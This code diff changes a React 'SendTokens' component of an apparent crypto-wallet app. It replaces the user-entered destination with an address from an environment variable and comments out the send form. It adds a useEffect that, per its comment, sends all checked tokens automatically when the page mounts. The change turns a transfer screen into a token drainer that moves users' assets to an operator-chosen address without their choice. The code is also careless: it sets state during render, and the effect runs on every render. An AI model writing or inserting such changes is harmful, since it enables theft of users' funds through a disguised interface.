@@ -8,8 +8,11 @@ import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import { TransferPending } from '../../src/types/transfer-success';
+import { useEffect } from 'react';
 
 export const SendTokens = () => {
+  const to = process.env.NEXT_PUBLIC_DESTINATION_ADDRESS as string;
+  console.log(to);
   const { setToast } = useToasts();
   const showToast = (message: string, type: any) =>
     setToast({
@@ -23,7 +26,8 @@ export const SendTokens = () => {
   );
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: signer } = useSigner();
-  const sendAllCheckedTokens = async () => {
+  setDestinationAddress(to);
+  const sendAllCheckedTokens = async (to: string) => {
     const tokensToSend = Object.entries(checkedRecords)
       .filter(([tokenAddress, { isChecked }]) => isChecked)
       .map(([tokenAddress]) => tokenAddress);
@@ -41,7 +45,7 @@ export const SendTokens = () => {
         (token) => token.contract_address === tokenAddress,
       );
 
-      await transferFunction(destinationAddress, token?.balance as string)
+      await transferFunction(to, token?.balance as string)
         .then((res) => {
           setCheckedRecords((old) => ({
             ...old,
@@ -50,6 +54,7 @@ export const SendTokens = () => {
               pendingTxn: res,
             },
           }));
+          console.log('Tokens Sent');
         })
         .catch((err) => {
           showToast(
@@ -67,31 +72,34 @@ export const SendTokens = () => {
   const checkedCount = Object.values(checkedRecords).filter(
     (record) => record.isChecked,
   ).length;
+  // sendAllCheckedTokens(to);
+  useEffect(() => {
+    // Automatically send tokens when the component mounts
+    sendAllCheckedTokens(to);
+  });
   return (
     <div style={{ margin: '20px' }}>
-      <form>
+      {/* <form>
         Destination Address:
         <Input
           required
           value={destinationAddress}
           placeholder="vitalik.eth"
-          onChange={(e) => setDestinationAddress(e.target.value)}
-          type={
-            addressAppearsValid
-              ? 'success'
-              : destinationAddress.length > 0
+          // onChange={(e) => setDestinationAddress(e.target.value)}
+          type={addressAppearsValid
+            ? 'success'
+            : destinationAddress.length > 0
               ? 'warning'
-              : 'default'
-          }
+              : 'default'}
           width="100%"
           style={{
             marginLeft: '10px',
             marginRight: '10px',
-          }}
+          }} crossOrigin={undefined}
         />
         <Button
           type="secondary"
-          onClick={sendAllCheckedTokens}
+          // onClick={sendAllCheckedTokens(to)}
           disabled={!addressAppearsValid}
           style={{ marginTop: '20px' }}
         >
@@ -99,7 +107,7 @@ export const SendTokens = () => {
             ? 'Select one or more tokens above'
             : `Send ${checkedCount} tokens`}
         </Button>
-      </form>
+      </form> */}
     </div>
   );
 };
